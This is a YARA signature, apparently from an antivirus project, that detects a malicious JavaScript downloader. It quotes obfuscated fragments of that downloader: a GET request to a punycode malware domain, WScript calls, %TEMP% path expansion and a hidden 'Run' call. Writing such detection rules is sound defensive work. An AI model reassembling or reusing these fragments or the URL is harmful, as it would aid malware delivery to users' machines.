rule sig_20160428_11befb110f09a5b89e10e8d3105503cc {
  meta:
    description = "datamaliciousorder - file 20160428_11befb110f09a5b89e10e8d3105503cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "37a44e819bb5dd574a3e1263ded6a6a78e016cc40b4982bbcbce9ad2dacbb3fc"

  strings:
    $s1  = "RhjHzsOekSauJsyJxbTou[PqrYofSinAdxOaeGppRdo](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function QykVlsAybEqeOmwWscTyc() {return QtqEttWkeKnbEpnHxzYth[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function LqeNkuYffEssLfvTbkQgr(QuyQyxCoqHstAegKqlWhn){QtqEttWkeKnbEpnHxzYth[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function LqeNkuYffEssLfvTbkQgr(QuyQyxCoqHstAegKqlWhn){QtqEttWkeKnbEpnHxzYth[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return IhmVogVjkHhrHljDimDso - AjoSruByjQxuSwgWpxBly;};" fullword ascii
    $s6  = "var QtqEttWkeKnbEpnHxzYth = function LyySjiUrfFrpQgnJthYbl() {return NgbNypMtkKibMmiEnsPhs[EbyJclTsbLdfPkaEbrXre](\"WScript\"+\"" ascii
    $s7  = "function UdoQdcOeoStsCwaOhrFoi(IhmVogVjkHhrHljDimDso, AjoSruByjQxuSwgWpxBly){PfyXsmHnfXppEsrGxvFqj = PfyXsmHnfXppEsrGxvFqj * 1; " ascii
    $s8  = "var QtqEttWkeKnbEpnHxzYth = function LyySjiUrfFrpQgnJthYbl() {return NgbNypMtkKibMmiEnsPhs[EbyJclTsbLdfPkaEbrXre](\"WScript\"+\"" ascii
    $s9  = "var NgbNypMtkKibMmiEnsPhs = this[\"WScript\"];" fullword ascii
    $s10 = "function QykVlsAybEqeOmwWscTyc() {return QtqEttWkeKnbEpnHxzYth[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (RhjHzsOekSauJsyJxbTou[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function UdoQdcOeoStsCwaOhrFoi(IhmVogVjkHhrHljDimDso, AjoSruByjQxuSwgWpxBly){PfyXsmHnfXppEsrGxvFqj = PfyXsmHnfXppEsrGxvFqj * 1; " ascii
    $s13 = "function ZyjZijFhtEqrIuuVluDuv(){return KviMysSahMvmBtjSvvEpy + \"\";};" fullword ascii
    $s14 = "function AdoBdvAghYctQqeWfoYad() {return ((WtlPfmQiuZyoQsyHchQge == true) && (WtlPfmQiuZyoQsyHchQge == HbtGdiOgrYqsQyfWjxPim)) ?" ascii
    $s15 = "function AdoBdvAghYctQqeWfoYad() {return ((WtlPfmQiuZyoQsyHchQge == true) && (WtlPfmQiuZyoQsyHchQge == HbtGdiOgrYqsQyfWjxPim)) ?" ascii
    $s16 = "PakOmdVlfLdrSzrIviSkx = true;" fullword ascii
    $s17 = "var WtlPfmQiuZyoQsyHchQge = false;" fullword ascii
    $s18 = "WtlPfmQiuZyoQsyHchQge = true; " fullword ascii
    $s19 = "HbtGdiOgrYqsQyfWjxPim = true; " fullword ascii
    $s20 = "var HbtGdiOgrYqsQyfWjxPim = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}